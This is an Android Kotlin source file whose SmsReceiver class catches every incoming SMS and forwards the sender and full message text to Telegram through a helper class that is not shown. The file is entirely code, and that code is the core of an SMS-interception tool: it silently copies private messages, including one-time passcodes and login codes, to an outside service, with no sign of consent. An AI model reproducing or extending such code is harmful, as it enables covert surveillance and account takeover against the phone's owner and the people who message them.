package com.security.testapp

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            val fullMessage = messages.joinToString("") { it.displayMessageBody ?: "" }
            val sender = messages.firstOrNull()?.displayOriginatingAddress ?: "Unknown"
            val text = "📩 SMS from $sender:\n$fullMessage"
            TelegramHelper.sendWithFallback(text, context)
        }
    }
}
